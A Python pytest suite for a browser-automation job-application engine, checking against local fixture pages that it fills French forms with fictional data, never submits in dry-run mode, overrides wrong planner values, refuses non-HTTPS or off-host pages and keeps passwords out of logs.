"""Apply engine against local fixture pages (loopback server, headless Chromium). Fictional data only."""

from __future__ import annotations

import asyncio
import json
import re

import pytest

from apply_fakes import (CONFIRMED, FIXTURES, FACT_PASSWORD, TEST_PASSWORD, FakeVerifier, ScriptedPlanner, act, cv_pdf, fast,  # noqa: F401
                         form_actions, form_plan, job_plan, page, password_for, release, sample_facts, server)  # noqa: F401
from jobhunt.apply import engine
from jobhunt.apply.engine import Letter, Uploads, confirmation_evidence, pick_variant, run_application
from jobhunt.apply.types import Action, Fact, FormField, Question, StepPlan
from jobhunt.llm import LLMError


async def go(page, server, planner, tmp_path, cv_pdf, *, mode="dry_run", start="job", facts=None, **kw):
    uploads = kw.pop("uploads", None) or Uploads(cv_pdf=cv_pdf)
    kw.setdefault("password", password_for)
    kw.setdefault("max_steps", 6)
    kw.setdefault("verifier", FakeVerifier())
    if mode == "submit":
        kw.setdefault("before_submit", no_reasons)
    url = kw.pop("url", None) or server.url(start)
    return await run_application(page, url=url, facts=facts or sample_facts(), planner=planner, uploads=uploads,
                                 mode=mode, out_dir=tmp_path / "shots", job_title="Technicien", company="Exemple SA", **kw)


async def no_reasons():
    return []


def apply_posts(server):
    return server.posts_to("/apply")


# ------------------------------------------------------------------ happy paths
async def test_dry_run_fills_everything_and_never_sends(page, server, fast, cv_pdf, tmp_path):
    planner = ScriptedPlanner([job_plan, form_plan("submit")])
    res = await go(page, server, planner, tmp_path, cv_pdf)
    assert res.status == "ready" and not apply_posts(server)
    assert await page.input_value("#fn") == "Camille" and await page.input_value("input[name=last_name]") == "Durand"
    assert await page.input_value("#em") == "camille@example.test"
    assert await page.input_value("#tel") == "+33 6 00 00 00 00"  # variant matching the +33 placeholder
    assert await page.input_value("#sit") == "alt"
    assert await page.evaluate("document.querySelector('input[name=dispo]:checked').value") == "oui"
    assert await page.evaluate("document.getElementById('cv').files[0].name") == cv_pdf.name
    assert await page.is_checked("input[name=rgpd]") and not await page.is_checked("input[name=newsletter]")
    assert [s.page_kind for s in res.steps] == ["job_page", "form"] and res.steps[0].clicked == "Postuler" and res.steps[1].clicked == ""
    assert all(s.screenshot and (tmp_path / "shots" / f"step-{s.index}.png").is_file() for s in res.steps)
    assert {f.fact for f in res.steps[1].filled} >= {"first_name", "email", "phone", "consent_required"}
    assert res.final_url.endswith("/form") and res.finished_at is not None


@pytest.mark.parametrize("role", ["next", "open_form", "login", "signup", "cookies", "other", None])
async def test_dry_run_cannot_send_even_if_planner_mislabels_the_final_button(page, server, fast, cv_pdf, tmp_path, role):
    planner = ScriptedPlanner([job_plan, form_plan(role)])  # type: ignore[arg-type]
    res = await go(page, server, planner, tmp_path, cv_pdf, max_steps=4)
    assert not apply_posts(server) and res.status != "submitted"
    if role in ("next", "open_form", "login", "signup", "cookies"):
        assert res.status == "ready"  # re-classified as submit -> stop before clicking


async def test_submit_mode_posts_exactly_once(page, server, fast, cv_pdf, tmp_path):
    planner = ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED])
    seen = []

    async def before():
        seen.append(1)
        return []

    res = await go(page, server, planner, tmp_path, cv_pdf, mode="submit", before_submit=before)
    assert res.status == "submitted" and seen == [1]
    posts = apply_posts(server)
    assert len(posts) == 1
    body = posts[0]["body"]
    assert b"Camille" in body and b"camille@example.test" in body and cv_pdf.name.encode() in body and b'name="rgpd"' in body
    assert b'name="newsletter"' not in body
    assert res.steps[-1].page_kind == "confirmation" and res.steps[-2].clicked == "Envoyer ma candidature"


async def test_before_submit_reasons_block_without_posting(page, server, fast, cv_pdf, tmp_path):
    async def before():
        return ["CV non approuvé", "déjà postulé"]

    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, mode="submit",
                   before_submit=before)
    assert res.status == "blocked" and "CV non approuvé" in res.message and not apply_posts(server)


async def test_submit_not_confirmed_is_failed_with_submit_clicked_flag(page, server, fast, cv_pdf, tmp_path):
    # the page after the click is never classified as a confirmation
    planner = ScriptedPlanner([job_plan, form_plan("submit"), StepPlan(page_kind="form")])
    res = await go(page, server, planner, tmp_path, cv_pdf, mode="submit")
    assert res.status == "failed" and "Envoi non confirmé" in res.message
    assert len(apply_posts(server)) == 1 and res.submit_clicked and "submit_clicked" not in res.steps[-1].note


async def test_confirmation_without_our_submit_is_unexpected(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([StepPlan(page_kind="confirmation")]), tmp_path, cv_pdf, mode="submit")
    assert res.status == "failed" and "confirmation inattendue" in res.message
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf)  # dry run
    assert res.status == "ready"


# ------------------------------------------------------------------ multi-step, iframe, popup, combobox
def step1(snap):
    return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                               act(snap, r"E-mail", "fill", "email"), act(snap, r"Suivant", "click", role="next")])


def step2(role="submit"):
    return lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file"),
                                                           act(snap, r"confidentialité", "check", "consent_required"),
                                                           act(snap, r"Envoyer", "click", role=role)])


async def test_two_step_form_dry_run_and_submit(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([step1, step2()]), tmp_path, cv_pdf, start="step1")
    # dry run: the first page is filled, then NOTHING is clicked any more (data entered): later steps are not tested
    assert res.status == "ready" and not apply_posts(server) and res.steps[0].clicked == "" and len(res.steps) == 1
    assert "étapes suivantes n'ont pas été testées" in res.message and await page.input_value("#fn") == "Camille"
    assert not any("step2" in r for r in server.requests)
    res = await go(page, server, ScriptedPlanner([step1, step2(), CONFIRMED]), tmp_path, cv_pdf, start="step1", mode="submit")
    assert res.status == "submitted" and len(apply_posts(server)) == 1


@pytest.mark.parametrize("role", ["next", "open_form"])
async def test_final_button_called_next_is_reclassified_as_submit(page, server, fast, cv_pdf, tmp_path, role):
    res = await go(page, server, ScriptedPlanner([step2(role)]), tmp_path, cv_pdf, start="step2")
    assert res.status == "ready" and not apply_posts(server) and "reclassé en submit" in res.steps[-1].note


async def test_iframe_form(page, server, fast, cv_pdf, tmp_path):
    plan = ScriptedPlanner([form_plan("submit")])
    res = await go(page, server, plan, tmp_path, cv_pdf, start="framed")
    assert res.status == "ready" and not apply_posts(server)
    assert await page.frame_locator("iframe").locator("#fn").input_value() == "Camille"
    res = await go(page, server, ScriptedPlanner([form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, start="framed", mode="submit")
    assert res.status == "submitted" and len(apply_posts(server)) == 1


async def test_popup_is_followed(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, start="popup")
    assert res.status == "ready" and res.final_url.endswith("/form") and len(page.context.pages) == 2


async def test_combobox(page, server, fast, cv_pdf, tmp_path):
    def plan(city_value):
        return lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"Ville", "select", "city", city_value),
                                                               act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan("toulouse")]), tmp_path, cv_pdf, start="combo")
    assert res.status == "ready" and await page.input_value("#city") == "Toulouse"
    res = await go(page, server, ScriptedPlanner([plan("Marseille")]), tmp_path, cv_pdf, start="combo")
    assert res.status == "needs_input" and res.questions[0].label == "Ville souhaitée"  # not among the options


# ------------------------------------------------------------------ guardrails on the planner's actions
async def test_required_field_without_known_fact_asks_and_does_not_click(page, server, fast, cv_pdf, tmp_path):
    facts = sample_facts(situation=None)
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, facts=facts, mode="submit")
    assert res.status == "needs_input" and not apply_posts(server) and res.steps[-1].clicked == ""
    q = res.questions[0]
    assert q.label == "Situation" and q.kind == "select" and q.options == ["Alternance", "Stage"]
    assert res.steps[-1].screenshot


async def test_action_citing_unknown_or_empty_fact_is_dropped(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        acts = [a for a in form_actions(snap) if a.fact != "first_name"]
        return StepPlan(page_kind="form", actions=[
            act(snap, r"^Prénom", "fill", "salary", "50000"),       # fact without value
            act(snap, r"^Nom", "fill", "nope", "Dupont"), *acts[1:],  # unknown fact (also duplicates ref -> dropped)
            act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="form")
    assert res.status == "needs_input" and {q.label for q in res.questions} >= {"Prénom", "Nom"}
    assert await page.input_value("#fn") == "" and await page.input_value("input[name=last_name]") == ""
    assert "fait cité inconnu" in res.steps[-1].note and "sans valeur" in res.steps[-1].note


async def test_missing_required_field_is_added_by_the_engine(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):  # planner forgets the CV and the consent and says nothing about them
        acts = [a for a in form_actions(snap) if a.op not in ("upload_cv", "check")]
        return StepPlan(page_kind="form", actions=[*acts, act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="form")
    assert res.status == "needs_input" and {"Curriculum vitae (PDF)", "J'accepte le traitement de mes données personnelles (RGPD)"} <= {
        q.label for q in res.questions}


async def test_exact_facts_ignore_the_planner_value(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        acts = form_actions(snap)
        acts[0].value, acts[2].value = "Mallory", "evil@example.test"
        return StepPlan(page_kind="form", actions=[*acts, act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="form")
    assert res.status == "ready" and await page.input_value("#fn") == "Camille" and await page.input_value("#em") == "camille@example.test"


async def test_select_value_outside_options_is_dropped(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        acts = [a for a in form_actions(snap) if a.op != "select" or a.fact != "situation"]
        return StepPlan(page_kind="form", actions=[*acts, act(snap, r"Situation", "select", "situation", "CDI"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="form")
    assert res.status == "needs_input" and await page.input_value("#sit") == "" and res.questions[0].label == "Situation"


async def test_bad_actions_are_dropped_with_notes(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        from jobhunt.apply.types import Action
        return StepPlan(page_kind="form", actions=[
            Action(ref="f999", op="fill", fact="first_name"),                     # unknown ref
            act(snap, r"RGPD", "fill", "first_name"),                              # op does not fit the kind
            act(snap, r"newsletter", "check", "consent_required"),                 # optional marketing box is never ticked
            act(snap, r"Prénom", "check", "first_name"),
            act(snap, r"Envoyer", "fill", "first_name")])
    res = await go(page, server, ScriptedPlanner([plan, plan]), tmp_path, cv_pdf, start="form", max_steps=3)
    assert not await page.is_checked("input[name=newsletter]") and not await page.is_checked("input[name=rgpd]")
    assert "référence inconnue" in res.steps[0].note and "incompatible" in res.steps[0].note and "non cochée" in res.steps[0].note
    assert res.status == "needs_input" and not apply_posts(server)  # nothing usable, required fields left empty


async def test_at_most_one_click_the_last_one(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"Envoyer", "click", role="submit"),
                                                   act(snap, r"Envoyer", "click", role="cookies")])
    # last click wins: "cookies" on the final button after nothing was filled and a >=3 field form -> reclassified as submit
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="form")
    assert not apply_posts(server) and res.status in ("ready", "needs_input")


# ------------------------------------------------------------------ account, verification, captcha, closed, errors
async def test_signup_with_secret_password_never_leaks(page, server, fast, cv_pdf, tmp_path):
    def signup(snap):
        pw = [f for f in snap.fields if f.kind == "password"]
        assert len(pw) == 2
        return StepPlan(page_kind="account_signup", actions=[
            act(snap, r"e-mail", "fill", "account_email"),
            *[act(snap, f.label, "fill", "account_password", value=FACT_PASSWORD, kind="password") for f in pw[:1]],
            *[type(act(snap, "Mot de passe", "fill", "account_password"))(ref=pw[1].ref, op="fill", fact="account_password")],
            act(snap, r"Créer mon compte", "click", role="signup")])
    verify = StepPlan(page_kind="email_verification", note="Cliquez sur le lien reçu par e-mail.")
    res = await go(page, server, ScriptedPlanner([signup, verify]), tmp_path, cv_pdf, start="signup", mode="submit")
    assert res.status == "needs_email" and "lien" in res.message
    posts = server.posts_to("/signup")
    assert len(posts) == 1 and posts[0]["body"].count(TEST_PASSWORD.encode()) == 2 and b"camille%40example.test" in posts[0]["body"]
    dump = res.model_dump_json()
    assert TEST_PASSWORD not in dump and FACT_PASSWORD not in dump and "•••" in dump
    assert not apply_posts(server)


async def test_password_unavailable_is_a_question(page, server, fast, cv_pdf, tmp_path):
    def signup(snap):
        return StepPlan(page_kind="account_signup", actions=[
            act(snap, r"^Mot de passe", "fill", "account_password"), act(snap, r"Créer mon compte", "click", role="signup")])
    res = await go(page, server, ScriptedPlanner([signup]), tmp_path, cv_pdf, start="signup", password=None, mode="submit")
    assert res.status == "needs_input" and not server.posts
    assert any(q.kind == "password" for q in res.questions) and TEST_PASSWORD not in res.model_dump_json()


async def test_signup_role_on_final_form_is_treated_as_submit(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("login")]), tmp_path, cv_pdf)
    assert res.status == "ready" and not server.posts


async def test_visible_captcha_needs_human_without_planning(page, server, fast, cv_pdf, tmp_path):
    planner = ScriptedPlanner([form_plan("submit")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="captcha")
    assert res.status == "needs_human" and not planner.calls and res.steps[0].screenshot
    res = await go(page, server, ScriptedPlanner([StepPlan(page_kind="captcha")]), tmp_path, cv_pdf, start="form")
    assert res.status == "needs_human"


async def test_closed_and_error_pages(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([StepPlan(page_kind="closed", note="expirée")]), tmp_path, cv_pdf)
    assert res.status == "blocked" and res.message == "Offre clôturée"
    res = await go(page, server, ScriptedPlanner([StepPlan(page_kind="other")]), tmp_path, cv_pdf)
    assert res.status == "failed" and len(res.steps) == 2  # no usable action twice in a row


async def test_planner_failure_and_max_steps(page, server, fast, cv_pdf, tmp_path):
    class Boom:
        async def plan(self, *a, **k):
            raise LLMError("secret model text", code="timeout")
    res = await go(page, server, Boom(), tmp_path, cv_pdf)
    assert res.status == "failed" and "timeout" in res.message and "secret model text" not in res.message
    async def inline(p, url):
        await p.set_content("<button type=button>Suivant</button>")
    res = await go(page, server, ScriptedPlanner([lambda s: StepPlan(page_kind="form", actions=[act(s, "Suivant", "click", role="next")])]),
                   tmp_path, cv_pdf, goto=inline, max_steps=3)
    assert res.status == "failed" and len(res.steps) == 3 and "Trop d'étapes" in res.message


async def test_custom_goto_is_used(page, server, fast, cv_pdf, tmp_path):
    called = []

    async def my_goto(p, url):
        called.append(url)
        await p.goto(url, wait_until="domcontentloaded")

    res = await go(page, server, ScriptedPlanner([job_plan, form_plan()]), tmp_path, cv_pdf, goto=my_goto)
    assert called == [server.url("job")] and res.status == "ready"


# ------------------------------------------------------------------ letter
async def test_letter_is_requested_once_and_only_for_required_fields(page, server, fast, cv_pdf, tmp_path):
    letter_pdf = tmp_path / "lettre.pdf"
    letter_pdf.write_bytes(b"%PDF-1.4\n%%EOF\n")
    calls = []

    async def letter():
        calls.append(1)
        return Letter(text="Madame, Monsieur, je candidate.", pdf_path=letter_pdf)

    def plan(snap):
        return StepPlan(page_kind="form", actions=[
            act(snap, r"^CV", "upload_cv", kind="file"), act(snap, r"^Lettre de motivation", "upload_letter"),
            act(snap, r"^Message", "letter_text"), act(snap, r"facultative", "upload_letter"),
            act(snap, r"Suivant", "click", role="next")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, uploads=Uploads(cv_pdf=cv_pdf, letter=letter), start="letter",
                   max_steps=1)
    assert calls == [1] and await page.evaluate("document.getElementById('lt').files[0].name") == "lettre.pdf"
    assert await page.input_value("#msg") == "Madame, Monsieur, je candidate."
    assert await page.evaluate("document.getElementById('opt').files.length") == 0
    # no letter available -> question, no click
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="letter", max_steps=2)
    assert res.status == "needs_input" and {q.label for q in res.questions} == {"Lettre de motivation", "Message au recruteur"}


# ------------------------------------------------------------------ unit
def test_pick_variant():
    fact = Fact(key="phone", label="Tél", value="+33 6 00 00 00 00", exact=True, variants=["0600000000", "06 00 00 00 00"])
    f = lambda **k: FormField(ref="f1", kind="tel", **k)  # noqa: E731
    assert pick_variant(fact, f()) == "+33 6 00 00 00 00"
    assert pick_variant(fact, f(placeholder="06 12 34 56 78")) == "06 00 00 00 00"
    assert pick_variant(fact, f(placeholder="0612345678")) == "0600000000"
    assert pick_variant(fact, f(), maxlength=10) == "0600000000"
    assert pick_variant(fact, f(), pattern=r"0\d{9}") == "0600000000"


# ================================================================== review round: structural guarantees
def extra_facts(**values):
    """sample_facts + facts of the review scenarios (fictional)."""
    facts = sample_facts()
    for k, (label, value, kw) in {
        "company": ("Entreprise", "ACME", {}),
        "work_auth": ("Autorisation de travail", "Titre de séjour étudiant en cours de validité (stage et alternance autorisés)", {}),
        "available_from": ("Disponible à partir de", "septembre 2026", {}),
    }.items():
        facts.facts.append(Fact(key=k, label=label, value=value, **kw))
    for f in facts.facts:
        if f.key in values:
            for attr, val in values[f.key].items():
                setattr(f, attr, val)
    return facts


# ------------------------------------------------------------------ A. dry run: structural
@pytest.mark.parametrize("role", ["next", "submit", "open_form", "cookies"])
async def test_dry_run_one_button_form_labelled_continuer_is_not_clicked(page, server, fast, cv_pdf, tmp_path, role):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file"),
                                                   act(snap, r"Continuer", "click", role=role)])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="continuer")
    assert res.status == "ready" and not server.posts and res.steps[-1].clicked == "" and not res.submit_clicked
    assert await page.evaluate("document.getElementById('cv').files.length") == 1  # filled, then nothing else


async def test_dry_run_native_submission_from_a_change_handler_is_blocked(page, server, fast, cv_pdf, tmp_path):
    plan = StepPlan(page_kind="form", actions=[])

    def upload(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file")])
    res = await go(page, server, ScriptedPlanner([upload, plan]), tmp_path, cv_pdf, start="autosubmit")
    assert res.status == "ready" and "soumission automatique" in res.message and not server.posts
    assert "soumission automatique bloquée" in " ".join(s.note for s in res.steps)
    # the guard is removed once the run is over: a normal submission works again in this context
    await page.goto(server.url("continuer"))
    await page.set_input_files("#cv", str(cv_pdf))
    await page.click("button")
    await page.wait_for_load_state()
    assert len(apply_posts(server)) == 1


async def test_dry_run_native_submission_from_an_iframe_is_blocked(page, server, fast, cv_pdf, tmp_path):
    await page.route("**/embed", lambda r: r.fulfill(content_type="text/html", body='<iframe src="/autosubmit" style="width:900px;height:500px"></iframe>'))

    def upload(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file")])
    res = await go(page, server, ScriptedPlanner([upload]), tmp_path, cv_pdf, start="embed")
    assert res.status == "ready" and not server.posts and "soumission automatique" in res.message


async def test_residual_limit_fetch_post_from_a_change_handler_is_NOT_blocked(page, server, fast, cv_pdf, tmp_path):
    """DOCUMENTED RESIDUAL LIMIT (engine docstring): an XHR / fetch sent by a change handler looks like any upload or validation
    call, so the request guard does not stop it. This test pins the behaviour so a change of it is a conscious decision."""
    def upload(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file")])
    await go(page, server, ScriptedPlanner([upload, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="fetchsubmit", max_steps=3)
    await asyncio.sleep(0.3)
    assert len(apply_posts(server)) == 1


async def test_dry_run_popup_is_not_followed_after_data_entry(page, server, fast, cv_pdf, tmp_path):
    def fill(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name")])
    res = await go(page, server, ScriptedPlanner([fill, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="popup_on_change", max_steps=3)
    await asyncio.sleep(0.3)
    assert res.final_url.endswith("/popup_on_change") and len(page.context.pages) == 1  # the popup was closed, never followed


async def test_popup_with_a_non_http_url_is_not_followed(page, server, fast, cv_pdf, tmp_path):
    await page.route("**/blank_popup", lambda r: r.fulfill(content_type="text/html", body=
        "<button onclick=\"window.open('about:blank','_blank')\">Postuler</button>"))
    res = await go(page, server, ScriptedPlanner([job_plan]), tmp_path, cv_pdf, start="blank_popup", max_steps=2)
    assert res.final_url.endswith("/blank_popup") and len(page.context.pages) == 1


async def test_dry_run_never_clicks_signup_and_never_types_a_password(page, server, fast, cv_pdf, tmp_path):
    hosts = []

    def pw(host):
        hosts.append(host)
        return TEST_PASSWORD

    def signup(snap):
        return StepPlan(page_kind="account_signup", actions=[
            act(snap, r"e-mail", "fill", "account_email"), act(snap, r"^Mot de passe", "fill", "account_password"),
            act(snap, r"Créer mon compte", "click", role="signup")])
    res = await go(page, server, ScriptedPlanner([signup]), tmp_path, cv_pdf, start="signup", password=pw)
    assert res.status == "ready" and "compte" in res.message and not server.posts and hosts == []
    assert await page.input_value("#pw") == "" and TEST_PASSWORD not in res.model_dump_json()


# ------------------------------------------------------------------ B. submit mode: fail closed
async def test_submit_without_before_submit_is_blocked_before_anything(page, server, fast, cv_pdf, tmp_path):
    planner = ScriptedPlanner([job_plan, form_plan("submit")])
    res = await go(page, server, planner, tmp_path, cv_pdf, mode="submit", before_submit=None)
    assert res.status == "blocked" and "garde-fou" in res.message and not planner.calls and not server.requests and not res.submit_clicked


async def test_on_submit_click_is_awaited_once_right_before_the_click(page, server, fast, cv_pdf, tmp_path):
    seen = []

    async def hook():
        seen.append(len(apply_posts(server)))
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit",
                   on_submit_click=hook)
    assert res.status == "submitted" and seen == [0] and len(apply_posts(server)) == 1 and res.submit_clicked


async def test_on_submit_click_failure_means_no_click(page, server, fast, cv_pdf, tmp_path):
    async def hook():
        raise RuntimeError("db down")
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, mode="submit", on_submit_click=hook)
    assert res.status == "blocked" and not apply_posts(server) and not res.submit_clicked and "db down" not in res.message


@pytest.mark.parametrize("after,status", [
    (StepPlan(page_kind="captcha"), "needs_human"),
    (StepPlan(page_kind="email_verification", note="Cliquez sur le lien reçu par e-mail."), "needs_email"),
    (StepPlan(page_kind="closed"), "blocked"),
    (StepPlan(page_kind="form"), "failed"),
    (LLMError("x", code="timeout"), "failed"),
    (RuntimeError("boom"), "failed"),
])
async def test_every_outcome_after_the_final_click_carries_the_flag(page, server, fast, cv_pdf, tmp_path, after, status):
    first = form_plan("submit")
    n = {"i": 0}

    class P:
        async def plan(self, snap, facts, **kw):
            n["i"] += 1
            if n["i"] == 1:
                return first(snap)
            if isinstance(after, Exception):
                raise after
            return after
    res = await go(page, server, P(), tmp_path, cv_pdf, start="form", mode="submit")
    assert res.status == status and res.submit_clicked and len(apply_posts(server)) == 1
    assert not any("submit_clicked" in x.note for x in res.steps)  # the flag is the only signal: the old note token is gone


async def test_validation_error_after_the_send_click_ends_with_the_owner_message_after_one_click(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    hooks = []

    async def hook():
        hooks.append(1)
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="errform", mode="submit", on_submit_click=hook, max_steps=8)
    assert res.status == "failed" and "Le site signale une erreur de saisie après le clic" in res.message and res.submit_clicked and len(hooks) == 1
    assert not server.posts


async def test_fake_confirmation_while_the_form_is_still_there_is_not_submitted(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan, CONFIRMED]), tmp_path, cv_pdf, start="noop_submit", mode="submit")
    assert res.status == "failed" and "Envoi non confirmé" in res.message and res.submit_clicked


class _Swap:
    """Planner that changes the page between the snapshot and the click (like a late script)."""

    def __init__(self, page, plan, js):
        self.page, self.plan_, self.js, self.n = page, plan, js, 0

    async def plan(self, snap, facts, **kw):
        self.n += 1
        if self.n == 1:
            p = self.plan_(snap)
            await self.page.evaluate(self.js)
            return p
        return StepPlan(page_kind="form")


async def test_element_swapped_after_the_snapshot_is_not_clicked(page, server, fast, cv_pdf, tmp_path):
    hooks, before = [], []

    async def hook():
        hooks.append(1)

    async def guard():
        before.append(1)
        return []
    swap = _Swap(page, form_plan("submit"), "document.querySelector('button[type=submit]').textContent = 'Supprimer mon dossier'")
    res = await go(page, server, swap, tmp_path, cv_pdf, start="form", mode="submit", on_submit_click=hook, before_submit=guard)
    assert not server.posts and hooks == [] and not res.submit_clicked and swap.n >= 2
    assert "clic annulé" in " ".join(s.note for s in res.steps)
    # same for a plain navigation click
    swap = _Swap(page, step1, "document.querySelector('button').remove()")
    res = await go(page, server, swap, tmp_path, cv_pdf, start="step1", mode="submit")
    assert not any("step2" in r for r in server.requests) and "clic annulé" in " ".join(s.note for s in res.steps)


async def test_hidden_or_disabled_target_is_not_clicked(page, server, fast, cv_pdf, tmp_path):
    swap = _Swap(page, step1, "document.querySelector('button').disabled = true")
    await go(page, server, swap, tmp_path, cv_pdf, start="step1", mode="submit")
    assert not any("step2" in r for r in server.requests)


async def test_navigation_labelled_last_button_is_recorded_and_confirmed_structurally(page, server, fast, cv_pdf, tmp_path):
    # a last-step button labelled "Continuer" is pure navigation by its label: it is gated + recorded (on_nav_click); the form
    # being gone and the page saying "merci", the run is `submitted` and flagged as sent
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file"), act(snap, r"Continuer", "click", role="next")])
    navs, finals = [], []

    async def nav():
        navs.append(len(apply_posts(server)))

    async def final():
        finals.append(1)
    res = await go(page, server, ScriptedPlanner([plan, CONFIRMED]), tmp_path, cv_pdf, start="continuer", mode="submit",
                   on_nav_click=nav, on_submit_click=final)
    assert res.status == "submitted" and res.submit_clicked and len(apply_posts(server)) == 1 and navs == [0] and finals == []


async def test_a_second_non_navigation_click_is_counted_and_capped(page, server, fast, cv_pdf, tmp_path):
    hooks = []

    async def hook():
        hooks.append(1)
    def plan(snap):  # "other-looking" roles on the final button are final clicks too (open_form after data)
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"), act(snap, r"Envoyer", "click", role="open_form")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="errform", mode="submit", on_submit_click=hook, max_steps=8)
    assert len(hooks) == 1 and res.submit_clicked and res.status == "failed"


# ------------------------------------------------------------------ B6/D. https and secrets
def _fake_host(page, scheme):
    async def setup():
        body = (FIXTURES / "form.html").read_text(encoding="utf-8")
        await page.route(f"{scheme}://jobs.example.test/**", lambda r: r.fulfill(status=200, content_type="text/html", body=body))
    return setup()


async def test_non_https_page_refuses_any_data(page, server, fast, cv_pdf, tmp_path):
    await _fake_host(page, "http")
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="http://jobs.example.test/form")
    assert res.status == "blocked" and "non sécurisée" in res.message.lower() and await page.input_value("#fn") == ""
    assert res.steps[0].filled == []


async def test_https_page_is_fine_and_the_host_is_logged(page, server, fast, cv_pdf, tmp_path):
    await _fake_host(page, "https")
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/form",
                   allowed_hosts={"other.example.test"})
    assert res.status == "blocked" and res.untrusted_host == "jobs.example.test" and await page.input_value("#fn") == ""
    assert "jobs.example.test" in res.steps[0].note and "hors hôte de l'offre" in res.steps[0].note
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/form",
                   allowed_hosts={"jobs.example.test"})
    assert res.status == "ready" and await page.input_value("#fn") == "Camille" and "hors hôte" not in res.steps[0].note


async def test_password_echoed_by_the_page_never_reaches_the_planner_or_the_result(page, server, fast, cv_pdf, tmp_path):
    secret = "Pa ss&w/rd é1"

    def login(snap):
        return StepPlan(page_kind="account_login", actions=[
            act(snap, r"e-mail", "fill", "account_email"), act(snap, r"^Mot de passe", "fill", "account_password"),
            act(snap, r"Se connecter", "click", role="login")])
    after = StepPlan(page_kind="email_verification", note="Lien envoyé.")
    planner = ScriptedPlanner([login, after])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="login_get", mode="submit", password=lambda host: secret, max_steps=3)
    assert res.status == "needs_email" and len(planner.calls) == 2
    from urllib.parse import quote, quote_plus
    forms = [secret, quote(secret, safe=""), quote_plus(secret), quote(secret), secret.replace(" ", "+")]
    echoed = planner.calls[1]["snapshot"]
    assert "password=" in echoed.url and "•••" in echoed.url  # the page DID echo it (URL, text, revealed text field)
    assert "•••" in echoed.text and any(f.value == "•••" for f in echoed.fields if f.kind == "text" and "Mot de passe" in f.label)
    blob = "\n".join(json.dumps(c["snapshot"].model_dump(), ensure_ascii=False) for c in planner.calls) + res.model_dump_json()
    for form in forms:
        assert form not in blob and form not in json.dumps(res.model_dump(mode="json"), ensure_ascii=False)
